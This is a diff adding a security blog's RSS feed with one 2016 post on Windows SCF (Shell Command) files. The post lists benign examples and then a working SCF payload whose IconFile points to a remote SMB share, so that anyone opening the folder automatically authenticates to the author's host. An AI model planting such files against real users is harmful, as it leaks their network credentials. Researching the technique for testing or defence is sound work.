@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Windows on Room362</title>
+    <link>//room362.com/tags/windows/</link>
+    <description>Recent content in Windows on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Tue, 14 Jun 2016 07:35:28 -0500</lastBuildDate>
+    <atom:link href="//room362.com/tags/windows/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>SMB/HTTP Auth Capture via SCF File</title>
+      <link>//room362.com/post/2016/smb-http-auth-capture-via-scf/</link>
+      <pubDate>Tue, 14 Jun 2016 07:35:28 -0500</pubDate>
+      
+      <guid>//room362.com/post/2016/smb-http-auth-capture-via-scf/</guid>
+      <description>
+
+&lt;p&gt;Recently saw a link to an SCF file. Didn&amp;rsquo;t know what those were
+so I went digging. Turns out they are a simple text based file that
+controls Windows Explorer. ;-)&lt;/p&gt;
+
+&lt;p&gt;Here are the examples I found via the references:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Open Explorer&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[Shell] 
+Command = 2 
+IconFile = explorer.exe, 1
+[Taskbar] 
+Command = Explorer
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Open &amp;ldquo;Channels&amp;rdquo; page in IE:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[Shell]
+Command=3
+IconFile=shdocvw.dll,-118
+[IE]
+Command=Channels
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This didn&amp;rsquo;t work for me at all, probably because Internet Explorer doesn&amp;rsquo;t have &amp;ldquo;Channels&amp;rdquo; anymore.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Minimize all windows:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[Shell]
+Command=2
+IconFile=explorer.exe,3
+[Taskbar]
+Command=ToggleDesktop
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;My first attempt to utilize this file format for fun was of course
+to just set the IconFile to an SMB share:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[Shell]
+Command=2
+IconFile=\\192.168.1.101\share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;and that worked as expected, every time the share was opened, whoever
+opened that folder it automatically attempted to authenticate to the
+share that I specified. Lots easier than writing an LNK file.&lt;/p&gt;
+
+&lt;p&gt;My gut is telling me there is more to this file format than meets the
+eye, especially when there are malware writers using it as well. I
+haven&amp;rsquo;t been able to get my hands on one to see what they are doing
+inside the file, but I assume it&amp;rsquo;s not just to minimize all windows.&lt;/p&gt;
+
+&lt;p&gt;There are some hints that you can invoke COM objects.. who knows&amp;hellip;&lt;/p&gt;
+
+&lt;h2 id=&#34;references:e67e0d37e8d3b4e0dfb3acae6e53ff79&#34;&gt;References:&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.blitzmax.com/Community/posts.php?topic=76323&#34;&gt;http://www.blitzmax.com/Community/posts.php?topic=76323&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20090122115553/http://shellrevealed.com/forums/thread/7604.aspx&#34;&gt;https://web.archive.org/web/20090122115553/http://shellrevealed.com/forums/thread/7604.aspx&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.programmershare.com/2403039/&#34;&gt;http://www.programmershare.com/2403039/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
